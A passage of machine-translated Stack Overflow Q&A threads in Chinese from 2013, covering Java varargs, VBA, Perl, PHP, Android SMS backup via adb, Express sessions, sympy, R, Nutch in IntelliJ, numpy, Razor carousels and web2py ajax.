if (elem.className.toLowerCase() == 'code') { 
```

而不是在它之外，解决了我的问题。

# java - Java 泛型可变参数方法参数

> ID：15357439
> 
> 赞同：18
> 
> 时间：2013-03-12T09:25:43.157
> 
> 标签：java, arrays, variadic-functions

我想知道是否有一种简单、**优雅**且可重用的方法将字符串和字符串数组传递给期望可变参数的方法。

```
/**
 * The entry point with a clearly separated list of parameters.
 */
public void separated(String p1, String ... p2) {
    merged(p1, p2, "another string", new String[]{"and", "those", "one"});
}

/**
 * For instance, this method outputs all the parameters.
 */
public void merged(String ... p) {
    // magic trick
} 
```

即使所有类型都是一致的（`String`），我也找不到告诉 JVM 将p2*展平*并将其注入合并参数列表的方法？

此时唯一的方法是创建一个新数组，将所有内容复制到其中并将其传递给函数。

任何想法？

* * *

## 编辑

根据您的建议，这里是我将使用的通用方法：

```
/**
 * Merge the T and T[] parameters into a new array.
 *
 * @param type       the destination array type
 * @param parameters the parameters to merge
 * @param <T>        Any type
 * @return the new holder
 */
@SuppressWarnings("unchecked")
public static <T> T[] normalize(Class<T> type, Object... parameters) {
    List<T> flatten = new ArrayList<>();
    for (Object p : parameters) {
        if (p == null) {
            // hum... assume it is a single element
            flatten.add(null);
            continue;
        }
        if (type.isInstance(p)) {
            flatten.add((T) p);
            continue;
        }
        if (p.getClass().isArray() && 
            p.getClass().getComponentType().equals(type)) {
            Collections.addAll(flatten, (T[]) p);
        } else {
            throw new RuntimeException("should be " + type.getName() + 
                                             " or " + type.getName() + 
                                             "[] but was " + p.getClass());
        }
    }
    return flatten.toArray((T[]) Array.newInstance(type, flatten.size()));
}

normalize(String.class, "1", "2", new String[]{"3", "4", null}, null, "7", "8"); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T09:41:36.590

我认为没有办法将标量和数组隐式展平为单个数组。

我能想到的最干净的解决方案是使用辅助函数：

```
// generic helper function
public static<T> T[] join(T scalar, T[] arr) {
    T[] ret = Arrays.copyOfRange(arr, 0, arr.length + 1);
    System.arraycopy(ret, 0, ret, 1, arr.length);
    ret[0] = scalar;
    return ret;
}

public void separated(String p1, String ... p2) {
    merged(join(p1, p2));
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T09:41:39.930

将签名更改`merge`为：

```
public<T> void merged(T ... p) 
```

至少可以让您毫无问题地调用合并。但是，您必须将字符串数组作为参数处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:40:46.140

我认为创建一个新数组是要走的路。

例如，您可以使用`ArrayUtils`Apache [Commons](http://commons.apache.org/proper/commons-lang/)来实现这一目标。

```
ArrayUtils.addAll(p2, p1); 
```

最好的问候，托马斯

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T10:07:54.670

我怀疑你能做到这一点，Java 编译器应该将 merge(p1, p2) 转换为合并的 ( p1, p2 [ 0 ], p2 [ 1 ] ... p2 [ p2.length ] )，但我不认为他们曾经想创建这样一个智能编译器（如果合并（p1，p2）也存在，它也会产生问题）。

您可以这样做（使用伪语法）：

```
import com.google.common.collect.Lists
import java.util.Arrays

separated ( String p1, String... p2 ) {
  merged ( Lists.asList ( p1, p2 ) )
}

merged ( List<String> p ) {
...
}

merged ( String ... p ) {
  merged ( Arrays.asList ( p )
} 
```

Arrays 来自标准 JDK，[Lists](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/collect/Lists.html)来自 Guava。两个 asList() 方法都在下划线数组上创建视图，而不是副本，因此没有太多速度/内存问题。

我认为不存在更简单的方法。是的，正如其他人所建议的那样，复制到一个新数组中更简单，但会耗费时间/内存。如果您的数组很小，创建和访问列表可能会比复制慢，但对于较大的数组，复制将成为更高的开销。

我喜欢塞巴斯蒂安的建议：您定义了一个合并（）的包装器，它可以在飞行中展平数组。只要 merge() 不是第 3 方方法并且您可以更改它，这就会很好地工作。否则，我在这里做类似的事情。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-12T09:46:55.290

在 内`separated`，参数`p2`是一个`String[]`。该`merged`方法可以采用*单个*参数`String[]`或*字符串*序列，但不能同时采用两者，所以我认为除了构建一个新数组（这就是可变参数在幕后所做的）之外，您没有太多选择。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-12T09:47:16.973

来自[可变参数文档](http://docs.oracle.com/javase/1.5.0/docs/guide/language/varargs.html)

> 最后一个参数类型后面的三个句点表示最后一个参数可以作为数组或参数序列传递。

它明确指出`an array OR a sequence of arguments`，因此您必须自己展平阵列，例如 NPE 所建议的。

# vba - VBA比较Excel中的行/列

> ID：15357442
> 
> 赞同：0
> 
> 时间：2013-03-12T09:25:47.333
> 
> 标签：vba, excel

我正在编写一个 VBA 代码，它可以让我看到每天交易头寸的变化。我对 VBA 编程相当陌生，想获得一些关于我编写的代码的反馈（并从这里的各种帖子中复制）。

我有 3 张纸，一张是今天的交易（sheet1），一张是昨天的交易（sheet2），还有一张应该突出从“第 n 天”到“第 n-1 天”的变化（第 3 天）。在“A”列中，我有每个交易唯一的交易 ID（ID1、ID2 等），从“B”列到“AA”，我有日期、值、文本等数据。

在“更改”表（表 3）中，我想在“A”列中有一条评论，说明交易是“新”、“删除/到期”还是“已更改”。如果一笔交易发生了变化，我想通过显示前后值来查看哪些单元格发生了变化。

我主要关心的是我的代码和性能中的错误，例如，有时我的电子表格中有超过 500 行 x 30 列。

当我从我的交易系统下载数据到 Excel 时，有时我的单元格没有内容，我希望我的代码考虑到这一点。我认为我当前的代码不能很好地做到这一点。

任何建议/反馈将不胜感激！

```
Sub CompData()

    Dim ws1 As Worksheet, ws2 As Worksheet, ws3 As Worksheet
    Dim ws1LRow As Long, ws2LRow As Long
    Dim i As Long, j As Long
    Dim ws1LCol As Long, ws2LCol As Long
    Dim Cell1 As Range, Cell2 As Range
    Dim SearchString As String
    Dim MatchFound As Boolean
    Dim n As Integer
    Dim NewDeal As String, MatDeal As String, ChangedDeal As String

    NewDeal = "New deal"
    MatDeal = "Matured/deleted deal"
    ChangedDeal = "Changed deal"

    Set ws1 = Sheets("sheet1")
    With ws1
        ws1LRow = .Range("A" & .Rows.Count).End(xlUp).Row
        ws1LCol = .Cells(2, .Columns.Count).End(xlToLeft).Column
    End With

    Set ws2 = Sheets("sheet2")
    With ws2
        ws2LRow = .Range("A" & .Rows.Count).End(xlUp).Row
        ws2LCol = .Cells(2, .Columns.Count).End(xlToLeft).Column
    End With

    Set ws3 = Sheets("sheet3")
    With ws3
        Cells.Clear
    End With

    n = 1

    For i = 1 To ws1LRow

        SearchString = ws1.Range("A" & i).Value

        Set Cell1 = ws2.Columns(1).Find(What:=SearchString, LookIn:=xlValues, _
                LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
                MatchCase:=False, SearchFormat:=False)

        If Not Cell1 Is Nothing Then
            Set Cell2 = Cell1
            MatchFound = True

            For j = 1 To ws1LCol
                If ws1.Cells(i, j).Value <> ws2.Cells(Cell1.Row, j).Value Then
                    MatchFound = False
                    Exit For
                End If
            Next

            If MatchFound = False Then
                ws3.Cells(n, 2).Value = ws1.Cells(i, 1).Value
                ws3.Cells(n, j + 1).Value = ws1.Cells(i, j).Value
                ws3.Cells(n, ws2LCol + 2).Value = ws2.Cells(i, 1).Value
                ws3.Cells(n, ws2LCol + j + 1).Value = ws2.Cells(i, j).Value
                ws3.Cells(n, 1).Value = ChangedDeal
                n = n + 1
            End If

        Else:
            ws3.Cells(n, 2).Value = ws1.Cells(i, 1).Value
            ws3.Cells(n, 1).Value = NewDeal
            n = n + 1
        End If
    Next

    ws2.Select
    For i = 1 To ws2LRow
        SearchString = ws2.Range("A" & i).Value

        Set Cell2 = ws1.Columns(1).Find(What:=SearchString, LookIn:=xlValues, _
                LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
                MatchCase:=False, SearchFormat:=False)
        If Cell2 Is Nothing Then
            ws3.Cells(n, 2).Value = ws2.Cells(i, 1).Value
            ws3.Cells(n, 1).Value = MatDeal
            n = n + 1
        End If
    Next

    ws3.Select

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:32:19.083

您可以做到这一点的一种方法是构建一个排序的交易 ID 列表，其中包含：

*   第一栏：贸易编号
*   第二列：它在第一个列表中的行（如果不是，#na）
*   第三列：它在第二个列表中的行（如果不是，#na）

如果您在每个工作表上构建每个排序列表，然后在另一个函数中聚合数据，这很容易完成。

关于你的空行，我认为你应该做一些预处理来聚合这些行，或者如果你想允许空行，你需要决定电子表格中的最大行数。

PS：如果你在某家法国银行工作，可能会出现在我的楼层，我们可以喝杯咖啡 :)

# perl - 是否可以将外部文件行存储为标量变量并在 PERL 中使用某些条件循环遍历它？

> ID：15357445
> 
> 赞同：1
> 
> 时间：2013-03-12T09:25:59.993
> 
> 标签：perl

下面的代码可以正常工作并打印出那些包含单词“Street”的行。我想知道是否有另一种方法可以在不使用特殊变量 $_ 的情况下做同样的事情。例如，将每一行放入一个增量标量变量中，并为相同的条件循环每一行。我是 perl 的新手，因此听起来很愚蠢，很抱歉给您带来麻烦。非常感谢任何建议，谢谢。

```
use strict;
use warnings;
use utf8;

open(fh1,"sample.file");

while(<fh1>){
    print if /Street/ ;
}
close fh1; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:29:11.497

`while(my $line = <fh1>)`如果您想避免使用，您可以使用，`$_`但我无法想象您为什么要这样做。

如果要将其读入数组，

```
@array = <$fh1>; 
```

然后在此之后，您可以访问单个元素`$array[0]`... `$array[N]`。

```
my @array = <fh1>;
for(my $i =0; $i<$#array; $i++){
     print $array[$i] if $array[$i] =~ /Street/
} 
```

* * *

对于大文件，与一次消耗一行输入相比，将整个文件读入数组将耗费时间和内存。

# php - php if 语句 html 选项值

> ID：15357450
> 
> 赞同：5
> 
> 时间：2013-03-12T09:26:27.897
> 
> 标签：php, option, if-statement

假设您有以下 html select 语句

```
<select>
<option value="Newest">Newest</option>
<option value="Best Sellers">Best Sellers</option>
<option value="Alphabetical">Alphabetical</option>
</select> 
```

现在我想运行一个 php if elseif 语句，它说，

```
if (option value = newest) {
// Run this
}
elseif ( option value = best sellers ) {
// Run this
} 
```

等等。但我不知道在 if elseif 语句中放什么。换句话说，而不是'option value = latest'（我知道这是不正确的），我可以放什么以便如果选择了最新的它将执行if语句，或者如果选择了畅销书，它将执行elseif语句？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-12T09:31:50.263

为您的选择命名。

```
<select name="selectedValue">
<option value="Newest">Newest</option>
<option value="Best Sellers">Best Sellers</option>
<option value="Alphabetical">Alphabetical</option>
</select> 
```

在您的 PHP 中，您将执行以下操作：

`$_POST['selectedValue'];`

如果我是你，我更喜欢**switch-case** incase，有两个以上的条件。

例子：

```
switch($_POST['selectedValue']){
case 'Newest':
    // do Something for Newest
break;
case 'Best Sellers':
    // do Something for Best seller
break;
case 'Alphabetical':
    // do Something for Alphabetical
break;
default:
    // Something went wrong or form has been tampered.
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-12T09:30:38.190

首先在您的选择上输入名称：

```
<select name="demo">
<option value="Newest">Newest</option>
<option value="Best Sellers">Best Sellers</option>
<option value="Alphabetical">Alphabetical</option>
</select> 
```

然后

```
if ($_POST['demo'] === 'Newest') {
// Run this
}
elseif ( $_POST['demo'] === 'Best Sellers' ) {
// Run this
} 
```

或者

```
switch($_POST['demo']){
    case 'Newest' : 
        //some code;
        break;
    case 'Best Sellers':
        //some code;
        break;
    default:
        //some code if the post doesn't match anything
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:29:25.867

`<select>`应该有一个`name`属性，例如`<select name="sortorder">`. 然后你可以说

```
if ($_REQUEST['sortorder'] == 'Newest') {
  // TODO sortorder 'Newest' was selected.
} 
```

如果你知道表单数据是通过 HTTP GET 还是 HTTP POST 进来的，你可以分别使用`$_GET['sortorder']`or `$_POST['sortorder']`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:29:58.220

我认为易于阅读的版本是：

```
switch($option){
    case 'Newest':
        runNewestFunction();
    break;
    case 'Best Sellers':
        runBestSellersFunction();
    break;
    case 'Alphabetical':
        runAlphabeticalFunction();
    break;
    default:
        runValidationRequest();
} 
```

另外，请添加名称属性`<select name="option">`

# android - 提取短信（触摸屏损坏，设备未植根，HTC Wildfire）

> ID：15357451
> 
> 赞同：0
> 
> 时间：2013-03-12T09:26:34.630
> 
> 标签：android, sms

我有一台 HTC Wildfire S A510e（Android 2.3.5，未植根）。我想提取我的 SMS 消息并将它们导入另一台设备。

问题：

*   内部存储器上没有可用空间。不能安装短信备份等应用。
*   触摸屏坏了，我无法解锁显示屏或使用任何按钮（例如主页、返回、搜索）。
*   设备未植根。我无法查看 /data/ 的内容或使用`adb shell`.

HTC 设备上的 SMS 消息存储在哪个目录中？然后我也许可以使用以下命令来获取备份，因为它无需 root 权限即可工作：

```
adb pull <backupfile> 
```

SMS数据库有什么格式？也许我可以在文件系统中搜索该文件扩展名？

如果没有剩余内存，是否可以root手机？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:35:29.173

SMS 消息存储在消息传递应用程序的数据文件夹中的 SQLite 数据库中。数据库的扩展名应该是`.db`.

尽管我对 HTC 设备不熟悉，但它应该位于此处：

```
/data/data/com.android.providers.telephony/databases/mmssms.db
```

也许您可以尝试通过`adb`?

# node.js - 在 express 框架中的会话中出现奇怪的错误

> ID：15357457
> 
> 赞同：30
> 
> 时间：2013-03-12T09:26:49.317
> 
> 标签：node.js, express

我是表达框架的新手，这是我在`server.js`文件中的内容：

```
// Module dependencies.
var application_root = __dirname,
express = require( 'express' ), //Web framework
path = require( 'path' ), //Utilities for dealing with file paths
mongoose = require( 'mongoose' ); //MongoDB integration

//Create server
var app = express();

// Configure server
app.configure( function() {

app.use( express.bodyParser() );
app.use( express.methodOverride() );
app.use( app.router );
app.use(express.session({secret:'thisismysupersecret'}));
app.use( express.static( path.join( application_root, 'site') ) );
app.use( express.errorHandler({ dumpExceptions: true, showStack: true }));
});
app.post("/verifyLogin",function(request,response){
var usr=request.body.username;
var pass=request.body.password;
//request.session.email=usr;
response.redirect('dashboard');
});

//Start server
var port = 3000;
app.listen( port, function() {
console.log( 'Express server listening on port %d in %s mode', port, app.settings.env);
}); 
```

当我导航到 localhost:3000 时出现此错误

> 500 类型错误：无法读取未定义的属性“connect.sid”

问题出在哪里？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2013-03-12T09:30:00.263

您缺少`cookieParser`中间件：

```
...
app.use( express.cookieParser() );
app.use(express.session({secret:'thisismysupersecret'}));
... 
```

（因为会话是使用 cookie 实现的）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-13T09:03:18.880

我遇到了同样的问题。

一定要打电话

```
app.use( express.cookieParser() ); 
```

前

`app.use(express.session({secret:'thisismysupersecret'}));`

# python - python中的数学限制？

> ID：15357458
> 
> 赞同：7
> 
> 时间：2013-03-12T09:26:50.430
> 
> 标签：python, turtle-graphics

我正在尝试在 python 中做数学限制。

我为烟雾定义了一个函数

```
import turtle
t = turtle.Pen()

def drawsmoke(y):
    i = 0
    while i < ((2 * y) - 1):
        t.seth(i * 5)
        t.circle((10 + i), 160)
        i = i + 2 
```

这吸引了烟雾的一侧，另一侧尚未完成。

现在问题出现了，当我尝试绘制大约 4 个烟雾圈（y = 4）时，烟雾开始转向错误的方向。为了解决这个问题，我考虑做一个数学限制。我会做一个变量

```
 smkang=(i*5) 
```

然后对这个变量做一个限制：

```
 lim
    smkang->20 
```

我该怎么做？还是有另一种不涉及限制的方法？顺便说一句，这是海龟（python 语言，但海龟进口）谢谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-12T10:50:39.743

使用[sympy](http://sympy.org/en/index.html)。SymPy 是一个用于符号数学的 Python 库。它旨在成为一个功能齐全的计算机代数系统（CAS），同时保持代码尽可能简单，以便易于理解和易于扩展。SymPy 完全用 Python 编写，不需要任何外部库。前任：

```
>>> from sympy import limit, Symbol, sin, oo
>>> x = Symbol("x")
>>> limit(sin(x)/x, x, 0)
1 
```

# r - 在 R 中生成结果网格

> ID：15357459
> 
> 赞同：1
> 
> 时间：2013-03-12T09:26:56.590
> 
> 标签：r

我正在编写一些代码来对某些参数值进行最大似然估计，并且我正在尝试创建从 optim 函数中获取的参数值的曲面图，并且需要创建一个网格来执行此操作。这是我需要创建一个让我感到困惑的网格的部分，我的 MLE 函数如下所示：

```
loglike<-function(par,dat,scale)
{ ptp<-dat[1:length(dat)-1]
  ptp1<-dat[2:length(dat)]

  r<-par['r']
  k<-par['k']
  sigma<-par['sigma']

  if(scale=='log')
  {
    return(sum(dnorm(log(ptp1)-log(ptp)*exp(r-(ptp/k)),mean=0,sd=sigma,log=T)))
  }

  if (scale=='sqrt')
  {
    return(sum(dnorm(sqrt(ptp1)-sqrt(ptp)*exp(r-(ptp/k)),mean=0,sd=sigma,log=T)))
  }

  if (scale=='linear')
  {
    return(sum(dnorm(ptp1-ptp*exp(r-(ptp/k)),mean=0,sd=sigma,log=T)))
  }
} 
```

我已经从 optim 中创建了一些数据，为我提供了相应的参数值

我尝试从 optim 函数中获取输出并将其放入 expand.grid 函数中，例如：

```
gridlog<-expand.grid(logs[,"r"],logs[,"sigma"],logs[,"k"]) 
```

但这所做的只是创建一个填充了所有相同值的大型矩阵。

进入 expand.grid 函数的数据从以下位置填充：

```
logs<-list()
for(i in seq(1,300,0.1)){
  logs[i]<-optim(par=c(r=i,k=i,sigma=i),fn=loglike,dat=dat,scale='log',method='Nelder-Mead',control=list(fnscale=-1))

}
logs<-do.call(rbind,logs) 
```

这将创建一个 300 长的对应 sigma 的 r 和 k 的矩阵

我的数据是：

```
c(100, 128.675595618645, 75.436115414503, 146.398449792328, 102.419994706974, 
207.397726741841, 23.4579309898438, 42.4085746569567, 119.498216389673, 
59.7845591706614, 119.37201616882, 252.047672957539, 28.3165331949818, 
57.4918213065119, 311.615538092141, 8.53779749227741, 31.5382580618134, 
115.617013730077, 43.6907812963781, 70.9139870053552, 123.004040266686, 
132.575148404208, 114.813947981006, 115.950032495637, 120.891472762661, 
97.0207348527786, 235.618894638631, 17.0936655960759, 49.4419128844531, 
112.476950569973, 58.3241789008329, 80.0300102105128, 103.248819284132, 
99.1968765946717, 113.905769052605, 143.181386861766, 62.962989192695, 
174.054591300157, 39.9156352770331, 81.8344415290292, 176.631480374326, 
51.5564038694108, 131.542259464434, 72.5981749979889, 38.9733086158719, 
126.808054274927, 73.6960412245896, 62.5484608101147, 55.539355637003, 
137.888502803112, 106.921926717155, 140.000738390606, 162.512046122238, 
26.2949484171288, 80.4110888678422, 74.0481779531392, 33.9890286552257, 
142.477859644323, 55.1820570626643, 107.242498924143, 56.8497685792794, 
143.676120209843, 84.2334844367379, 67.0330079913484, 109.96246704725, 
157.216290273118, 59.4585552091703, 67.2986524284706, 55.2529503291083, 
38.932960005221, 62.7454169122216, 210.687014199037, 38.7348882392115, 
75.6645116341029, 115.924283193145, 117.772958122253, 45.5313134644358, 
112.306998515583, 38.7001172906923, 66.1308507048062, 122.516808638813, 
38.8283932430479, 168.014298040365, 38.0902373313928, 117.414876109978, 
168.615976661456, 66.5037228223079, 94.4482610053865, 505.254990783834, 
1.05181785078369, 1.77594058056118, 4.36034444400473, 12.1485473106491, 
82.2373017835424, 58.9775202042162, 132.907299665772, 51.2346939236555, 
123.251093218535, 143.077217943039, 96.1524852870813) 
```

任何人都可以提供的任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T10:36:59.390

```
#find optimum:
fit<-optim(par=c(r=1,k=1,sigma=1),fn=loglike,dat=dat,scale='log',
           method='Nelder-Mead',control=list(fnscale=-1))

fit$par
        r           k       sigma 
0.3911590 254.4989317   0.5159761 

# make grid around optimum with few selected sigma values:

rs<-seq(0.01,1,length=30)
ks<-seq(230,280,length=30)
sigmas<-c(0.25,0.5159761,0.75)

# this will contains all parameter combinations 
# and the corresponding likelihood values

mlegrid<-cbind(as.matrix(expand.grid(rs,ks,sigmas)),0)  #Matrix
colnames(mlegrid)<-c('r','k','sigma','likelihood')

for(i in 1:nrow(mlegrid)){ #go through all combinations
  mlegrid[i,4]<- loglike(par=mlegrid[i,1:3],dat=dat,scale='log') 
}
mlegrid[which.max(mlegrid[,4]),] 
      r           k       sigma  likelihood 
0.3855172 257.5862069   0.5159761 -74.9940496 
# almost the same as from optim 
# (differences due to sparse grid, more dense gives more accurate results)

#for interactive plots, static versions with `persp` function
library(rgl)
persp3d(x=rs,y=ks,
        z=matrix(mlegrid[mlegrid[,3]==sigmas[1],4],nrow=length(rs)),col=2)
#with sigma from optim
persp3d(x=rs,y=ks,
        z=matrix(mlegrid[mlegrid[,3]==sigmas[2],4],nrow=length(rs)),col=2) 
persp3d(x=rs,y=ks,
        z=matrix(mlegrid[mlegrid[,3]==sigmas[3],4],nrow=length(rs)),col=2) 
```

# ant - 如何在 Intellij Idea 打开 Ant 项目（Nutch 源代码）？

> ID：15357462
> 
> 赞同：9
> 
> 时间：2013-03-12T09:27:02.977
> 
> 标签：ant, intellij-idea, nutch

我想在 Intellij IDEA打开 Nutch 2.1 源文件（ [http://www.eu.apache.org/dist/nutch/2.1/ ）。](http://www.eu.apache.org/dist/nutch/2.1/)以下是如何在 Eclipse 中打开它的说明：[http ://wiki.apache.org/nutch/RunNutchInEclipse](http://wiki.apache.org/nutch/RunNutchInEclipse)

但是我不熟悉 Ant（我使用 Maven），当我打开该源文件时，Intellij 不知道许多类。IE：

```
org.apache.hadoop.mapreduce.JobContext
org.apache.gora.mapreduce.GoraMapper 
```

我怎样才能将它们添加到图书馆或我应该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-11-09T04:01:36.760

我终于弄清楚该怎么做。现在我们的团队可以在 IntellIJ 中开发 nutch

我们做的过程

1.  从 apache.org 获取 nutch 源

`wget [http://www.eu.apache.org/dist/nutch/2.3/apache-nutch-2.3-src.tar.gz](http://www.eu.apache.org/dist/nutch/2.3/apache-nutch-2.3-src.tar.gz)`

2.  在intellij中导入nutch源

3.  通过 Ant 获取依赖

    *   跑`ant runtime`
    *   跑`ant test`
4.  将依赖项导入 Intellij

    *   文件 > 项目结构
    *   图书馆 > 常春藤
    *   点击加号按钮
    *   选择所有库`apache-nutch-2.3/build/lib`

现在我们有了一个带有 nutch 源和所有依赖项的项目

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-21T23:25:27.283

我认为，您应该将 ant build 用于 nutch 项目。因为，pom.xml 对于 nutch 来说是有问题的。如果您仍然想使用 maven，请检查 pom.xml 中的 maven 依赖项。

我认为，问题可以通过以下方式解决：

*   您通过想法创建新项目并添加 nutch 源。Idea 不支持 ivy ant 项目。你可以为idea安装ivy插件，我想，idea12不支持它。

或者

*   您可以通过eclipse为nutch创建ant项目，然后保存项目。然后通过eclipse类路径打开idea上的项目。

或者

*   您可以配置类路径。如果你使用 ant build，你应该添加 jars :`File->ProjectStructure`如下：

创建库 ![点击图书馆](../Images/e0b36b5b6b1bfc13b058199d6f659ec4.png)

附加文件 ![添加罐子](../Images/e769e6750d9d51b06d865038ede0663f.png)

然后，如果您使用**ant** build，请在构建后从 NUTCH_HOME/build/lib/* 中选择 jars。 ![选择罐子](../Images/d70f3cfdfd5a3e5823829db0c77c18f7.png)

如果您使用**maven**构建，请从 ~/.m2/* (MAVEN_REPO) 中选择 jars

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-05-10T13:56:34.063

尽管 Intellij 支持通过 ant 插件直接通过 IDE 运行 ant 脚本，但 Intellij 编辑器不会自行使用您的 build.xml 文件找出类路径。这将导致编辑器显示代码错误。

不幸的是，我找到的唯一解决方案是手动添加所有 jar。您可以通过使用 ant jar 命令构建 ant 项目来获取所需的所有 jar。

所以这些是您需要遵循的步骤：->

1.在程序根目录下运行ant jar命令

2.复制在build文件夹中创建的所有jar（它们不会直接在build文件夹中。我必须从build->ivy->lib->{project name}）

3.将这些 jar 粘贴到在目录外某处创建的新文件夹中

4.转到文件->项目结构->库。按 + 按钮。

5.选择所有复制的罐子，然后按确定出现任何提示。

6.按完成并等待索引完成。编辑器中的任何依赖错误现在都应该解决。

注意：由于您是手动添加 jar，因此如果您更改 build.xml 文件以更改任何依赖项，则需要使它们保持同步。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T10:08:42.853

似乎依赖项是使用 Ivy 管理的（请参阅`ivy`源档案中的文件夹），因此您可以尝试安装[Ivy 插件](http://plugins.jetbrains.com/plugin/?id=2267)，这将允许您修复类路径问题。

# python - Numpy 导入“中止”

> ID：15357466
> 
> 赞同：1
> 
> 时间：2013-03-12T09:27:23.167
> 
> 标签：python, numpy, installation

我正在使用安装了根`python2.7`( `/usr/bin/python2.7`) 的 linux 服务器。然后我尝试通过下载源代码并执行`python2.7 setup.py build; python2.7 setup.py install --user`. Numpy 整齐地安装到`~/.local/lib/python2.7/site-packages/numpy`. 我得到：

```
$ python2.7
Python 2.7.2+ (default, Dec 22 2011, 12:26:43)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import numpy
Aborted
$ 
```

我什至从哪里开始？我以前从未见过这个！

（仅供参考，默认的 python (2.6)，在 numpy 中安装了一个工作`/usr/lib/pymodules/python2.6/numpy`）

根据要求，**堆栈跟踪**，（并感谢您的说明！）。整个事情[都在 pastebin 上](http://pastebin.com/psZDMB8q)。

```
Program received signal SIGABRT, Aborted.
0x00002aaaabdb31b5 in *__GI_raise (sig=<value optimized out>)
    at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
64  ../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
    in ../nptl/sysdeps/unix/sysv/linux/raise.c
(gdb) bt
#0  0x00002aaaabdb31b5 in *__GI_raise (sig=<value optimized out>) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
#1  0x00002aaaabdb5fc0 in *__GI_abort () at abort.c:92
#2  0x00002aaab03fb9bd in free () from /usr/lib/python2.7/lib-dynload/_ctypes.so
#3  0x00002aaab03f8312 in ?? () from /usr/lib/python2.7/lib-dynload/_ctypes.so
#4  0x00002aaab03f8924 in ffi_closure_alloc () from /usr/lib/python2.7/lib-dynload/_ctypes.so
#5  0x00002aaab03f0af2 in _ctypes_alloc_callback () from /usr/lib/python2.7/lib-dynload/_ctypes.so
#6  0x00002aaab03eee68 in ?? () from /usr/lib/python2.7/lib-dynload/_ctypes.so
#7  0x00000000004b6ed5 in ?? ()
#8  0x0000000000425cdc in PyObject_Call () 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:39:38.833

这看起来像一个版本控制问题。确保您不会无意中将为 Python 2.6 构建的模块加载到 Python 2.7 中。

首先要检查的是`$PYTHONPATH`and `sys.path`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-07T11:16:04.847

我从来没有发现是什么原因造成的，但我让管理员以 root 身份安装了 numpy，它现在可以工作了。

# asp.net-mvc - C# foreach inside foreach，每项显示3项。旋转木马

> ID：15357468
> 
> 赞同：2
> 
> 时间：2013-03-12T09:27:28.537
> 
> 标签：asp.net-mvc, razor, foreach, carousel

我正在为我的项目使用 asp.net MVC 4，并且我有一个模型。我正在使用 Bootstrap Carousel 为我的索引页面显示产品（见下图）

现在我的问题是：我想在每个幻灯片项目中显示 3 个产品。我应该为此编写一个 ViewModel 吗？

```
<div class="carousel slide>
  @for (int i = 0; i <= Model.Count()/3; i++ ) <!-- this works well, paging -->
    {
      <div class="item @if(i==0){<text>active</text>}">
        @foreach(var well in Model)
        {
            <div class="span4">
                <!-- some html here -->
            </div>
        }
      </div>
    }
</div> 
```

![旋转木马](../Images/2e823c5d742ab8abe8880e9204e39113.png)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-13T01:42:15.090

您的内部`foreach`正在迭代整个`Model`集合 - 您需要将其限制为仅相关的三个项目。

我猜你想要类似的东西：

```
<div class="carousel slide>
    @for (int i = 0; i <= Model.Count()/3; i++ ) <!-- this works well, paging -->
    {
        <div class="item @if(i==0){<text>active</text>}">
        @foreach(var well in Model.Skip(i*3).Take(3))
        {
            <div class="span4">
                <!-- some html here -->
            </div>
        }
        </div>
    }
</div> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-14T09:41:51.633

考虑这个问题的一种方法是将原始集合拆分为每 3 个连续元素的组。幸运的是，您可以使用`GroupBy`“元素索引除以 3”作为键的 LINQ 方法。`Skip(x * 3).Take(3)`IMO，此解决方案的优点是它比在内部循环中重复集合更清楚地表达了您的意图并且具有更好的性能。

```
<div class="carousel slide>
    @foreach (var group in Model.Select((x, index) => new { element = x, index }).GroupBy(x => x.index / 3, x => x.element))
    {
        <div class="item @if( group.Key == 0) {<text>active</text>}">
        @foreach(var well in group)
        {
            <div class="span4">
                <!-- some html here -->
            </div>
        }
        </div>
    }
</div> 
```

我什至会将模型类型更改为`ILookup<int, TElement>`并在控制器中执行分组。

# web2py - web2py ajax如何发送参数？

> ID：15357475
> 
> 赞同：1
> 
> 时间：2013-03-12T09:27:39.447
> 
> 标签：web2py

```
<script type="text/javascript">
  $('#in').onclick=function()
  {
    var a='abc';
    ajax('echo',[a],'result');
  };
</script> 
```

如何使用 ajax 函数发送本地参数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T13:29:26.210

